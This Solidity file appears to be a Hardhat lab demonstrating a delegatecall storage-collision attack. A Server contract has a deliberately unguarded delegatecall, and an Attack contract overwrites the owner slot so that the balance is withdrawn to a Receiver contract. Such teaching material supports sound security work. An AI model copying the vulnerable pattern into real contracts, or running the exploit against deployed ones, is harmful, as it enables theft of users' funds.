// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;
// pragma solidity ^0.4.25;
import "hardhat/console.sol";

contract Server {
    address owner;

    constructor() payable {
        require(msg.value > 0, "require money transfer");
        console.log("[S] Server owner now is %s", msg.sender);
        owner = msg.sender;
    }

    function withdraw() public {
        console.log("[S] withdraw to %s", owner);
        payable(owner).transfer(address(this).balance);
    }

    function vuln(address addr, bytes calldata data) public {
        addr.delegatecall(data);
        //address(Attack).delegatecall(bytes4(keccak256("Attack_code()")));  
        //代码为被攻击者的代码，其使用了delegatecall函数。
    }
}

contract Attack {
    address owner;// NOTE: storage layout must be the same as contract Server
    Receiver public rec;
    // address target;

    constructor() {
        owner = msg.sender;
        console.log("[A] Attack owner now is %s", msg.sender);
        // target = rec.getAddress();
    }

    function exploit() public {
        rec = new Receiver();
        console.log("[A] exploit called");
        // the address of deployed Receiver contract for transfering stolen money
        owner = rec.getAddress();
        // owner = address(0xbDF79C4540C5d93CfAa3A2788686E4f63fF7fA4d);
        console.log("[A] now we takeover the owner to %s", owner);
    }
}

contract Receiver {
    address owner;

    constructor() {
        console.log("[R] Receiver created at %s", address(this));
        owner = msg.sender;
    }

    // Function to receive Ether. msg.data must be empty
    receive() external payable {
        console.log("[R] recived %s money", msg.value);
    }

    // Fallback function is called when msg.data is not empty
    fallback() external payable {}

    function withdraw() public {
        require(msg.sender == owner);
        payable(msg.sender).transfer(address(this).balance);
    }

    function getAddress() public view returns (address) {
        console.log("[R] getAddress called");
        return address(this);
    }
}